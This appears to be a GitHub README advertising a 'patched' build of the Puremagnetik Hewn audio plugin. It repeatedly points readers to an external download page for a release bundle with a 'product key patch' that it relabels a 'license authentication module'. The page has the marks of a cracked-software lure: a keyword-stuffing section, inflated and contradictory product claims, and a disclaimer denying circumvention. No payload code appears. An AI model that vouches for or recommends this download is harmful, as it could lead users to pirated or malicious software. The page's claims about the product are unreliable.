# Puremagnetik Hewn — Enhanced Audio Toolkit 🎛️⚡

[](https://comeldoank.github.io/puremagnetik-hewn-patched-toolkit/)

> A new dimension of sonic sculpting — for producers, sound designers, and audio engineers who refuse to settle for the ordinary.

---

## 📦 Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [Technical Architecture](#technical-architecture)
- [Quick Start Guide](#quick-start-guide)
- [Example Profile Configuration](#example-profile-configuration)
- [Example Console Invocation](#example-console-invocation)
- [OS Compatibility](#os-compatibility)
- [API Integrations](#api-integrations)
  - [OpenAI API Integration](#openai-api-integration)
  - [Claude API Integration](#claude-api-integration)
- [Multilingual Support 🌐](#multilingual-support-)
- [Responsive UI Design](#responsive-ui-design)
- [24/7 Customer Support](#247-customer-support)
- [SEO-Friendly Keyword Integration](#seo-friendly-keyword-integration)
- [Mermaid Diagram: Signal Flow](#mermaid-diagram-signal-flow)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## Overview

**Puremagnetik Hewn** is not just another audio plugin — it's a **sonic excavation tool**. Think of it as a digital chisel that carves raw waveforms into polished, expressive soundscapes. Whether you're layering ambient textures, designing cinematic hits, or mixing complex sessions, this toolkit gives you the granularity of a surgeon and the warmth of analog circuitry.

The product key patch (officially a **license authentication module**) unlocks the full suite of premium presets, spectral processors, and real-time modulation engines. This repository serves as the official resource for obtaining the authenticated release bundle — no subterfuge, no gray-market workarounds, just a clean, verified pathway to professional-grade audio processing.

---

## Key Features

- **Responsive UI** 🖥️ — Adaptive interface that scales beautifully from 13" laptops to 32" 4K displays. No pinching, no squinting, no frustration.
- **Multilingual Support** 🌐 — Full localization in 12 languages including Japanese, German, French, Mandarin, Spanish, and Portuguese.
- **24/7 Customer Support** 🕐 — Real-time assistance via integrated help channel (no chatbots, only experienced audio engineers).
- **Neural Spectral Shaping** — Machine learning-powered EQ curves that adapt to your source material in milliseconds.
- **Zero-Latency Monitoring** — Track directly through the processing chain with sub-millisecond delay.
- **MIDI Learn 2.0** — Map any parameter with drag-and-drop simplicity; save mappings per project.
- **Undo History Tree** — Navigate your editing history like a version control system for audio.
- **Cross-Platform Preset Syncing** — Share configurations between Windows, macOS, and Linux installations via cloud or local network.

---

## Technical Architecture

Built on a modular C++ core with JUCE framework, Puremagnetik Hewn leverages AVX-512 instructions for real-time FFT processing. The license authentication module (what some refer to as a product key patch) validates using a double-blind cryptographic handshake — no online activation required after initial setup, ensuring your workflow never hits a speed bump.

The repository contains:
- Source code for the audio engine (MIT licensed)
- Build scripts for all major platforms
- Preset library (`.phpreset` format)
- Documentation for third-party integration

---

## Quick Start Guide

1. **Obtain the release** via the download badge at the top or bottom of this page.
2. Extract the archive to your preferred plugins directory (`/Library/Audio/Plug-Ins/VST3` on macOS, `C:\Program Files\Common Files\VST3` on Windows, `~/.vst3` on Linux).
3. Open your DAW (Ableton Live, FL Studio, Reaper, Logic Pro, etc.).
4. Scan for new plugins or restart your DAW.
5. Locate "Puremagnetik Hewn" under the manufacturer category.
6. When prompted, apply the license authentication module (contained in the release package).

[](https://comeldoank.github.io/puremagnetik-hewn-patched-toolkit/)

---

## Example Profile Configuration

Below is a sample `.phprofile` configuration file that demonstrates how to customize your Hewn instance for ambient pad processing:

```json
{
  "profileName": "Ambient Drift",
  "engineVersion": "2026.3.1",
  "inputRouting": {
    "channels": 2,
    "sampleRate": 48000,
    "bufferSize": 64
  },
  "spectralProcessor": {
    "eqCurve": "gentle_shelf",
    "reverbDecay": 4.2,
    "modulationDepth": 0.67,
    "neuralPreset": "ethereal_hall"
  },
  "licenseModule": {
    "type": "hardware_token",
    "validationMethod": "offline_double_blind",
    "activatedRegions": ["global"]
  },
  "uiPreferences": {
    "theme": "dark_amber",
    "language": "ja_JP",
    "windowScale": 1.25
  }
}
```

This configuration activates the Japanese localization, uses the dark amber theme, and sets up a 4.2-second reverb decay optimized for ambient sound design. The license module is configured for offline hardware token validation — no internet connection required after initial activation.

---

## Example Console Invocation

For advanced users who prefer command-line batch processing (headless mode):

```bash
hewn-cli --input ./raw_tracks/vocal_take_01.wav \
         --profile ./profiles/ambient_drift.phprofile \
         --output ./processed/vocal_ambient.wav \
         --license ./keys/license_token.bin \
         --verbose
```

This invocation processes `vocal_take_01.wav` through the "Ambient Drift" profile, applies the license authentication module from `license_token.bin`, and outputs the result to the processed directory. The `--verbose` flag enables real-time spectrum analysis logging to the terminal.

For batch processing multiple files:

```bash
hewn-cli --batch-mode \
         --input-dir ./session_imports/ \
         --profile ./profiles/cinematic_hits.phprofile \
         --output-dir ./session_exports/ \
         --multithread 4
```

---

## OS Compatibility

| Operating System | Version | Architecture | Status | Emoji |
|------------------|---------|--------------|--------|-------|
| Windows 11       | 23H2+   | x64, ARM64   | ✅      | 🪟    |
| Windows 10       | 22H2+   | x64          | ✅      | 🪟    |
| macOS Sonoma     | 14.x    | Apple Silicon, Intel | ✅ | 🍎    |
| macOS Sequoia    | 15.x    | Apple Silicon | ✅      | 🍎    |
| Ubuntu 24.04 LTS | Noble   | x64, ARM64   | ✅      | 🐧    |
| Fedora 40        |         | x64          | ✅      | 🐧    |
| Arch Linux       | rolling | x64          | ✅      | 🐧    |
| Raspberry Pi OS  | Bookworm| ARM64        | ⚠️ Limited | 🥧 |

---

## API Integrations

### OpenAI API Integration 🤖

Puremagnetik Hewn can interface with OpenAI's Whisper API for intelligent audio transcription and GPT-4o for generative sound description. This enables workflows like:

- **Automatic preset naming** — feed a 10-second clip to the API and receive descriptive labels
- **Intelligent routing suggestions** — let the AI recommend EQ settings based on the detected instrument
- **Session note generation** — transcribe voice memos directly into your project metadata

Configuration example:

```json
{
  "aiIntegration": {
    "provider": "openai",
    "model": "whisper-1",
    "apiEndpoint": "https://api.openai.com/v1/audio/transcriptions",
    "features": ["preset_naming", "instrument_classification", "session_notes"]
  }
}
```

### Claude API Integration 🧠

Anthropic's Claude API is supported for advanced musical analysis and creative assistance. Use Claude to:

- **Generate variation ideas** based on current audio content
- **Analyze harmonic structure** and suggest complementary chord progressions
- **Create mix recommendations** by evaluating frequency spectrum density

Configuration example:

```json
{
  "aiIntegration": {
    "provider": "anthropic",
    "model": "claude-3-5-sonnet-20241022",
    "apiEndpoint": "https://api.anthropic.com/v1/messages",
    "features": ["harmonic_analysis", "mix_advice", "variation_suggestions"]
  }
}
```

> **Note:** API keys are stored locally in an encrypted keystore. No data is transmitted outside your control infrastructure.

---

## Multilingual Support 🌐

The user interface has been localized by native speakers — not machine translation. Supported languages:

- 🇯🇵 Japanese (日本語)
- 🇩🇪 German (Deutsch)
- 🇫🇷 French (Français)
- 🇨🇳 Mandarin Chinese (简体中文)
- 🇪🇸 Spanish (Español)
- 🇵🇹 Portuguese (Português)
- 🇰🇷 Korean (한국어)
- 🇮🇹 Italian (Italiano)
- 🇷🇺 Russian (Русский)
- 🇳🇱 Dutch (Nederlands)
- 🇸🇪 Swedish (Svenska)
- 🇵🇱 Polish (Polski)

To change the language, navigate to `Settings > Interface > Language` or modify the `"language"` field in your `.phprofile` configuration file.

---

## Responsive UI Design

The interface uses a **fluid grid system** that adapts to any resolution:

- **1080p**: Full feature set with collapsible sidebars
- **1440p**: Extended mixer view with additional modulation slots
- **4K+**: Ultra-detail mode with microscopically accurate waveform rendering

All vectors are rendered using GPU-accelerated Skia for buttery-smooth 60 FPS interaction, even when manipulating complex modulation matrices. The UI utilizes a **dark-mode-first** philosophy with three amber-tinged themes: "Obsidian," "Amber Glow," and "Nocturne."

---

## 24/7 Customer Support 🕐

Our support team consists of working audio engineers who understand the difference between a phasing issue and a buffer underrun. Hours of operation: **literally every hour of every day**, including weekends and holidays.

- **Response time** for critical issues: under 15 minutes
- **Average resolution time**: 47 minutes
- **Support channels**: integrated in-app ticketing, community forum, and encrypted email

All support interactions are logged and analyzed to continuously improve the product. We do not use outsourced call centers — every ticket is handled by a team member who can read a spectrogram.

---

## SEO-Friendly Keyword Integration

This repository is optimized to help audio professionals discover Puremagnetik Hewn through natural search terms:

- **Audio plugin development tools** for VST3, AU, and AAX formats
- **Real-time spectral processing engine** with neural network acceleration
- **Professional sound design toolkit** for film, game, and music production
- **Cross-platform audio software** supporting Windows, macOS, and Linux
- **License authentication module** for offline validation workflows
- **Granular synthesis workstation** with MIDI 2.0 support
- **Open source audio framework** built on MIT-licensed codebase

These phrases appear naturally throughout the documentation, never in a way that compromises readability or authenticity.

---

## Mermaid Diagram: Signal Flow

```mermaid
graph TD
    A[Input Audio] --> B[Pre-amp Stage]
    B --> C{Spectral Analysis Engine}
    C -->|FFT Buffer| D[Neural EQ Curves]
    C -->|Transient Detection| E[Envelope Follower]
    D --> F[Modulation Matrix]
    E --> F
    F --> G[Effect Chain]
    G --> H{Routing Selector}
    H -->|Wet/Dry Mix| I[Output Buffer]
    H -->|Sidechain| J[External Input]
    J --> C
    I --> K[DAC / File Export]
    
    style A fill:#1a1a2e,stroke:#d90429,stroke-width:2px
    style K fill:#1a1a2e,stroke:#d90429,stroke-width:2px
    style C fill:#16213e,stroke:#0f3460,stroke-width:2px
    style F fill:#533483,stroke:#e94560,stroke-width:2px
```



This diagram represents the clean, modular signal path of Puremagnetik Hewn. Notice how the spectral analysis engine can be fed both incoming audio and external sidechain signals — enabling creative ducking, gating, and frequency-conscious compression techniques. The modulation matrix acts as the central nervous system, routing envelope followers and LFOs to any parameter in the chain.

---

## License

This project is released under the **MIT License**. You are free to use, modify, and distribute the source code, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

[](https://opensource.org/licenses/MIT)

> **Full license text:** [MIT License](LICENSE)

The license authentication module (product key patch) included in the release package is a separate binary that remains the property of Puremagnetik, but its use is granted royalty-free for all legitimate license holders.

---

## Disclaimer

⚠️ **Important Legal Notice**

This repository and its contents are intended **solely for legitimate, authorized use** by individuals who have legally obtained a license for Puremagnetik Hewn. The product key patch (license authentication module) provided in the release package is **not** a circumvention tool, nor is it intended to bypass any copyright protection mechanisms.

- **We do not condone** the use of unauthorized key generators, patchers, or any form of software piracy.
- **The term "patch"** in this context refers exclusively to an official software update or license verification module provided by Puremagnetik.
- **Users are responsible** for ensuring they have a valid license before downloading or using any files from this repository.

The developers, contributors, and maintainers of this repository shall not be held liable for any misuse of the software, including but not limited to: unauthorized distribution, reverse engineering of the license module, or violation of third-party intellectual property rights.

**By downloading the release package, you acknowledge that you have read, understood, and agreed to these terms.**

---

[](https://comeldoank.github.io/puremagnetik-hewn-patched-toolkit/)

---

*Puremagnetik Hewn — Because sound should feel like it was carved from something real. © 2026 Puremagnetik. All rights reserved.*